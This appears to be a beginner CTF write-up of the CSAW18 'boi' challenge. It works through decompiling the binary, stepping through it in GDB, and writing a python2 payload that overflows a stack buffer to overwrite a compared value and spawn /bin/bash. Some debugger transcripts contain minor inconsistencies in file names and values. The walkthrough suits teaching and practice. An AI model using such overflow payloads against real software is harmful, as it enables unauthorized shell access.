### Buffer Overflow Practice

### Source: CSAW18

### Basic File Check

```
┌──(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ file boi     
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
                                                                                                                                                                                                                                                                                                                                                                                                                                    
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ checksec boi     
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

We're working with a x64 binary which is dynamically linked and non stripped 

It has canary & NX enabled as its protection

Lets run it to see what it does

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./boi    
Are you a big boiiiii??
yes
Sun 29 Jan 2023 12:27:34 WAT
                                                                                                                                                                                                                  
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./boi
Are you a big boiiiii??
no
Sun 29 Jan 2023 12:27:36 WAT
```

It justs asks if you are a boy then prints the current date after it receives input

I'll decompile the binary using ghidra

On checking the main function here's what i get (P.S-> I'll try to edit the binary for proper understanding)

```
int main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 uStack40;
  int expectedValue;
  undefined4 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_20 = 0;
  uStack40 = 0;
  expectedValue = L'\xdeadbeef;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (expectedValue == L'\xcaf3baee') {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

From this we know that

```
1. It asks for our input which then scans 0x18 bytes of data into input
2. But before the call of input it stores 0xdeadbeef in a variable
3. Then after it reads the user input, it compares the expectedValue with 0xcaf3baee
```

Now to see where our input reached i'll take a look at the stack from ghidra

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __stdcall main(void)
             int               EAX:4          <RETURN>
             undefined8        Stack[-0x10]:8 canary                                  XREF[2]:     00400659(W), 
                                                                                                   004006ca(R)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[1]:     00400677(W)  
             undefined4        Stack[-0x24]:4 expectedValue                           XREF[2]:     0040067e(W), 
                                                                                                   004006a5(R)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
             undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W), 
                                                                                                   0040068f(*)  
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:0040054d(*), 
                                                                                          _start:0040054d(*), 004007b4, 
                                                                                          00400868(*)  
        00400641 55              PUSH       RBP
```

Looking at the ghidra output we see that:

```
1. The input is stored at offset -0x38
2. The expectedValue is stored at offset -0x24
3. And the difference between the valud of the input nd expectedValue is 0x14
```

We have extra 0x4 bytes 

From this we know that we can since we have 0x18 bytes to write we can fill up the 0x14 bytes and overwrite target with 0x4 byte

Here's the bug, since we are given 0x18 which is then written in a 0x14 space making 0x4 bytes overflown in target

That gives us the ability to control the value. And why would we want to control we value is to bypass the check to grant to shell

Lets hope on to gdb

I'll set a breakpoint after the call to read function

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]                                                                                                                                                  
└─$ gdb -q boi                                                                                                                                                                                                     
GEF for linux ready, type `gef' to start, `gef config' to configure                                                                                                                                                
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11                                                                                                                           
Reading symbols from boi...                                                                                                                                                                                        
(No debugging symbols found in boi)                                                                                                                                                                                
gef_  disass main                                                                                                                                                                                                  
Dump of assembler code for function main:                                                                                                                                                                          
   0x0000000000400641 <+0>:     push   rbp                                                                                                                                                                         
   0x0000000000400642 <+1>:     mov    rbp,rsp                                                                                                                                                                     
   0x0000000000400645 <+4>:     sub    rsp,0x40                                                                                                                                                                    
   0x0000000000400649 <+8>:     mov    DWORD PTR [rbp-0x34],edi                                                                                                                                                    
   0x000000000040064c <+11>:    mov    QWORD PTR [rbp-0x40],rsi                                                                                                                                                    
   0x0000000000400650 <+15>:    mov    rax,QWORD PTR fs:0x28                                                                                                                                                       
   0x0000000000400659 <+24>:    mov    QWORD PTR [rbp-0x8],rax                                                                                                                                                     
   0x000000000040065d <+28>:    xor    eax,eax                                                                                                                                                                     
   0x000000000040065f <+30>:    mov    QWORD PTR [rbp-0x30],0x0                                                                                                                                                    
   0x0000000000400667 <+38>:    mov    QWORD PTR [rbp-0x28],0x0                                                                                                                                                    
   0x000000000040066f <+46>:    mov    QWORD PTR [rbp-0x20],0x0                                                                                                                                                    
   0x0000000000400677 <+54>:    mov    DWORD PTR [rbp-0x18],0x0                                                                                                                                                    
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef                                                                                                                                             
   0x0000000000400685 <+68>:    mov    edi,0x400764                                                                                                                                                                
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>                                                                                                                                                         
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]                                                                                                                                                              
   0x0000000000400693 <+82>:    mov    edx,0x18                                                                                                                                                                    
   0x0000000000400698 <+87>:    mov    rsi,rax                                                                                                                                                                     
   0x000000000040069b <+90>:    mov    edi,0x0                                                                                                                                                                     
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>                                                                                                                                                         
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]                                                                                                                                                    
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee                                                                                                                                                              
   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>                                                                                                                                                         
   0x00000000004006af <+110>:   mov    edi,0x40077c                                                                                                                                                                
   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>                                                                                                                                                          
   0x00000000004006b9 <+120>:   jmp    0x4006c5 <main+132>                                                                                                                                                         
   0x00000000004006bb <+122>:   mov    edi,0x400786                                                                                                                                                                
   0x00000000004006c0 <+127>:   call   0x400626 <run_cmd>                                                                                                                                                          
   0x00000000004006c5 <+132>:   mov    eax,0x0                                                                                                                                                                     
   0x00000000004006ca <+137>:   mov    rcx,QWORD PTR [rbp-0x8]                                                                                                                                                     
   0x00000000004006ce <+141>:   xor    rcx,QWORD PTR fs:0x28                                                                                                                                                       
   0x00000000004006d7 <+150>:   je     0x4006de <main+157>                                                                                                                                                         
   0x00000000004006d9 <+152>:   call   0x4004e0 <__stack_chk_fail@plt>                                                                                                                                             
   0x00000000004006de <+157>:   leave                                                                                                                                                                              
   0x00000000004006df <+158>:   ret                                                                                                                                                                                
End of assembler dump.                                                                                                                                                                                             
gef_  b *0x00000000004006a5                                                                                                                                                                                        
Breakpoint 1 at 0x4006a5                                                                                                                                                                                           
gef_  r        
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/boi 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Are you a big boiiiii??
pwner

Breakpoint 1, 0x00000000004006a5 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6               
$rbx   : 0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rcx   : 0x007ffff7ec102d  _  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x007fffffffdd60  _  0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rbp   : 0x007fffffffdda0  _  0x0000000000000001
$rsi   : 0x007fffffffdd70  _  0x000a72656e7770 ("pwner\n"?)
$rdi   : 0x0               
$rip   : 0x000000004006a5  _  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x623000          
$r9    : 0x21001           
$r10   : 0x007ffff7dd8b40  _  0x0010001200001a7e
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdec8  _  0x007fffffffe26b  _  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  _  0x007ffff7ffe2e0  _  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd60│+0x0000: 0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"    _ $rsp
0x007fffffffdd68│+0x0008: 0x0000000100000000
0x007fffffffdd70│+0x0010: 0x000a72656e7770 ("pwner\n"?)  _ $rsi
0x007fffffffdd78│+0x0018: 0x0000000000000000
0x007fffffffdd80│+0x0020: 0xdeadbeef00000000
0x007fffffffdd88│+0x0028: 0x00007fff00000000
0x007fffffffdd90│+0x0030: 0x0000000000000000
0x007fffffffdd98│+0x0038: 0x592c7cd1fa3aee00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 _   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ───$
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
[#0] 0x4006a5 _ main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef_ 
```

Now i'll search the stack for where my input is stored

```
gef_  search-pattern pwner
[+] Searching 'pwner' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdd70 - 0x7fffffffdd77  _   "pwner\n" 
gef_  x/10g 0x7fffffffdd70
0x7fffffffdd70: 0xa72656e7770   0x0
0x7fffffffdd80: 0xdeadbeef00000000      0x7fff00000000
0x7fffffffdd90: 0x0     0xe59b8bc266196900
0x7fffffffdda0: 0x1     0x7ffff7df018a
0x7fffffffddb0: 0x7fffffffdea0  0x400641
```

Here we can see that our input pwner is 0x14 bytes away from the variable `0xdeadbeef00000000`

Now i'll generate a payload which i'll try to use and overwrite the value in the memory

```
Payload: python2 -c "print '0'*0x14 + '\xee\xba\xf3\xca'" > input
```

Now i'll run the binary again and give the overwrite payload as input

```
──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]                                                                                                                                                  
└─$ gdb -q boi                                                                                                                                                                                                     
GEF for linux ready, type `gef' to start, `gef config' to configure                                                                                                                                                
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11                                                                                                                           
Reading symbols from boi...                                                                                                                                                                                        
(No debugging symbols found in boi)                                                                                                                                                                                
gef_  b *0x00000000004006a5                                                                                                                                                                                        
Breakpoint 1 at 0x4006a5                                                                                                                                                                                           
gef_  r < input                                                                                                                                                                                                
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/boi < overwrite                                                                                                                                 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'                                                                                
[Thread debugging using libthread_db enabled]                                                                                                                                                                      
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                                                                         
Are you a big boiiiii??                                                                                                                                                                                            
                                                                                                                                                                                                                   
Breakpoint 1, 0x00000000004006a5 in main ()                                                                                                                                                                        
[ Legend: Modified register | Code | Heap | Stack | String ]                                                                                                                                                       
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x17              
$rbx   : 0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rcx   : 0x007ffff7ec102d  _  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x007fffffffdd60  _  0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"
$rbp   : 0x007fffffffdda0  _  0x0000000000000001
$rsi   : 0x007fffffffdd70  _  0x4141414141414141 ("AAAAAAAA"?)
$rdi   : 0x0               
$rip   : 0x000000004006a5  _  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x623000          
$r9    : 0x21001           
$r10   : 0x007ffff7dd8b40  _  0x0010001200001a7e
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdec8  _  0x007fffffffe26b  _  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  _  0x007ffff7ffe2e0  _  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd60│+0x0000: 0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"    _ $rsp
0x007fffffffdd68│+0x0008: 0x0000000100000000
0x007fffffffdd70│+0x0010: 0x4141414141414141     _ $rsi
0x007fffffffdd78│+0x0018: 0xbeef414141414141
0x007fffffffdd80│+0x0020: 0xde0a00000000dead
0x007fffffffdd88│+0x0028: 0x00007fff00000000
0x007fffffffdd90│+0x0030: 0x0000000000000000
0x007fffffffdd98│+0x0038: 0xdab0ed20f3121800
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 _   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 _ main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef_                                                                                                      

```

Now lets search for the string "0" and see the memory address it is on the stack

```
gef_  search-pattern 000000000000
[+] Searching '000000000000' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc.so.6'(0x7ffff7f44000-0x7ffff7f97000), permission=r--
  0x7ffff7f680d0 - 0x7ffff7f680e0  _   "0000000000000000" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdd70 - 0x7fffffffdd7c  _   "000000000000[...]" 
gef_  x/10g 0x7ffff7f680d0
0x7ffff7f680d0 <zeroes>:        0x3030303030303030      0x3030303030303030
0x7ffff7f680e0: 0x0     0x0
0x7ffff7f680f0 <blanks>:        0x2020202020202020      0x2020202020202020
0x7ffff7f68100: 0x0     0x0
0x7ffff7f68110 <__PRETTY_FUNCTION__.0>: 0x5f656772616c6e65      0x66756272657375
gef_  x/10g 0x7fffffffdd70
0x7fffffffdd70: 0x3030303030303030      0x3030303030303030
0x7fffffffdd80: 0xcaf3baee30303030      0x7fff00000000
0x7fffffffdd90: 0x0     0xa9e382be03298600
0x7fffffffdda0: 0x1     0x7ffff7df018a
0x7fffffffddb0: 0x7fffffffdea0  0x400641
gef_  

```

Now this is good cause we overwrite the value that used to be `0xdeadbeef` to `0xcafebaee`

When the continue to the cmp function we see that we bypassed the check

```
gef_  disass main
Dump of assembler code for function main:
   0x0000000000400641 <+0>:     push   rbp
   0x0000000000400642 <+1>:     mov    rbp,rsp
   0x0000000000400645 <+4>:     sub    rsp,0x40
   0x0000000000400649 <+8>:     mov    DWORD PTR [rbp-0x34],edi
   0x000000000040064c <+11>:    mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400650 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400659 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040065d <+28>:    xor    eax,eax
   0x000000000040065f <+30>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000400667 <+38>:    mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040066f <+46>:    mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400677 <+54>:    mov    DWORD PTR [rbp-0x18],0x0
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:    mov    edi,0x400764
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
=> 0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>
   0x00000000004006af <+110>:   mov    edi,0x40077c
   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>
   0x00000000004006b9 <+120>:   jmp    0x4006c5 <main+132>
   0x00000000004006bb <+122>:   mov    edi,0x400786
   0x00000000004006c0 <+127>:   call   0x400626 <run_cmd>
   0x00000000004006c5 <+132>:   mov    eax,0x0
   0x00000000004006ca <+137>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006ce <+141>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004006d7 <+150>:   je     0x4006de <main+157>
   0x00000000004006d9 <+152>:   call   0x4004e0 <__stack_chk_fail@plt>
   0x00000000004006de <+157>:   leave  
   0x00000000004006df <+158>:   ret    
End of assembler dump.
gef_ 
```

Now i'll continue since its moving `0xcaf3baee` to the eax register

```
gef_  nexti                                                                                                                                                                                                        
0x00000000004006a8 in main ()                                                                                                                                                                                      
[ Legend: Modified register | Code | Heap | Stack | String ]                                                                                                                                                       
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xcaf3baee 
$rcx   : 0x007ffff7ec102d  _  0x5b77fffff0003d48 ("H="?)                                                                                                                                                   [55/695]
$rdx   : 0x18                                                                                                                                                                                                      
$rsp   : 0x007fffffffdd60  _  0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"                                                                                  
$rbp   : 0x007fffffffdda0  _  0x0000000000000001                                                                                                                                                                   
$rsi   : 0x007fffffffdd70  _  0x3030303030303030 ("00000000"?)                                                                                                                                                     
$rdi   : 0x0                                                                                                                                                                                                       
$rip   : 0x000000004006a8  _  <main+103> cmp eax, 0xcaf3baee                                                                                                                                                       
$r8    : 0x623000                                                                                                                                                                                                  
$r9    : 0x21001                                                                                                                                                                                                   
$r10   : 0x007ffff7dd8b40  _  0x0010001200001a7e                                                                                                                                                                   
$r11   : 0x246                                                                                                                                                                                                     
$r12   : 0x0                                                                                                                                                                                                       
$r13   : 0x007fffffffdec8  _  0x007fffffffe26b  _  "COLORFGBG=15;0"                                                                                                                                                
$r14   : 0x0                                                                                                                                                                                                       
$r15   : 0x007ffff7ffd020  _  0x007ffff7ffe2e0  _  0x0000000000000000                                                                                                                                              
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]                                                                                                        
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00                                                                                                                                                        
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd60│+0x0000: 0x007fffffffdeb8  _  0x007fffffffe236  _  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/b[...]"    _ $rsp                                                                            
0x007fffffffdd68│+0x0008: 0x0000000100000000                                                                                                                                                                       
0x007fffffffdd70│+0x0010: 0x3030303030303030     _ $rsi                                                                                                                                                            
0x007fffffffdd78│+0x0018: 0x3030303030303030                                                                                                                                                                       
0x007fffffffdd80│+0x0020: 0xcaf3baee30303030                                                                                                                                                                       
0x007fffffffdd88│+0x0028: 0x00007fff00000000                                                                                                                                                                       
0x007fffffffdd90│+0x0030: 0x0000000000000000                                                                                                                                                                       
0x007fffffffdd98│+0x0038: 0x4854c413bada3700                                                                                                                                                                       
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069b <main+90>        mov    edi, 0x0                                                                                                                                                                     
     0x4006a0 <main+95>        call   0x400500 <read@plt>                                                                                                                                                          
     0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]                                                                                                                                                    
 _   0x4006a8 <main+103>       cmp    eax, 0xcaf3baee                                                                                                                                                              
     0x4006ad <main+108>       jne    0x4006bb <main+122>                                                                                                                                                          
     0x4006af <main+110>       mov    edi, 0x40077c                                                                                                                                                                
     0x4006b4 <main+115>       call   0x400626 <run_cmd>                                                                                                                                                           
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>                                                                                                                                                          
     0x4006bb <main+122>       mov    edi, 0x400786                                                                                                                                                                
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a8 in main (), reason: SINGLE STEP                                                                                                                                           
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a8 _ main()                                                                                                                                                                                             
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef_  x/s $eas                                                                                                                                                                                                     
Value can't be converted to integer.                                                                                                                                                                               
gef_  x/s $eax                                                                                                                                                                                                     
0xffffffffcaf3baee:     <error: Cannot access memory at address 0xffffffffcaf3baee> 
```

Now lets run the payload on the binary

